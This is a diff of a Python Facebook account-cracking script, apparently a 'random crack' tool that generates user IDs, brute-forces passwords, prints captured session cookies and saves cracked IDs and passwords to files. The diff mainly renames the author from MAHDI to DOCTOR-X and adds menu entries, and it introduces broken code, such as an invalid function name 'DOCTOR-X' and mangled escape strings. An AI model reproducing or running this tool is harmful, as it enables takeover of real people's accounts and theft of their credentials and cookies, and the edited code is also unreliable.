@@ -146,7 +146,7 @@ logo = ("""
                                                    
 
  ┌─────────────────────────────────────────┐
- │ [✓] AUTHOR   : NUR UDDIN MAHDI         │
+ │ [✓] AUTHOR   : NUR UDDIN DOCTOR-X         │
  │ [✓] TOOL     : RANDOM CRACK             │
  │ [✓] STATUS   : FREE                     │
  │ [✓] GITHUB   : EMPTY          │
@@ -178,14 +178,16 @@ cps = []
 def mumit_menu():
     os.system('clear');print(logo)
     print('\033[1;92m [1] RANDOM CRACK')
-    print('\033[1;92m [0] EXIT TOOL')
+    print('\033[1;92m [0] BD CRACK')
+    print('/033[1,92m [0] PK CRACK')
+    print('/033[1,92m [0] FILE CLONING')
     linex()
     mumit=input(' \033[1;32m[?] SELECT MENU: ')
-    if mumit in['1','01']:MAHDI()
+    if mumit in['1','01']:DOCTOR-X()
     elif mumit in['0','00']:exit()
     else:exit()
     
-def MAHDI():
+def DOCTOR-X():
     user=[]
     twf =[]
     os.getuid
@@ -219,8 +221,8 @@ def MAHDI():
             uid = code+fuck
             ahare.submit(mumitx,uid,pwx,tl)
     print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('Ok Ids Saved in /MAHDI-OK.txt')
-    print('Cp Ids Saved in /MAHDI-CP.txt')
+    print('Ok Ids Saved in /DOCTOR-X-OK.txt')
+    print('Cp Ids Saved in /DOCTOR-X-CP.txt')
     linex()
     
 def mumitx(uid,pwx,tl):
@@ -266,24 +268,24 @@ def mumitx(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[MAHDI-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
+                print('\r\r\033[1;32m[DOCTOR-X-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                 print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                 cek_apk(session,coki)
-                open('/sdcard/MAHDI-OK.txt', 'a').write( cid+' | '+ps+'\n')
+                open('/sdcard/DOCTOR-X-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
                 if 'y' in cp_cpx: 
-                 print('\r\r\033[1;30m[MAHDI-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
-                open('/sdcard/MAHDI-CP.txt', 'a').write( cid+' | '+ps+' \n')
+                 print('\r\r\033[1;30m[DOCTOR-X-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
+                open('/sdcard/DOCTOR-X-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mMAHDI\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mDOCTOR-X\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
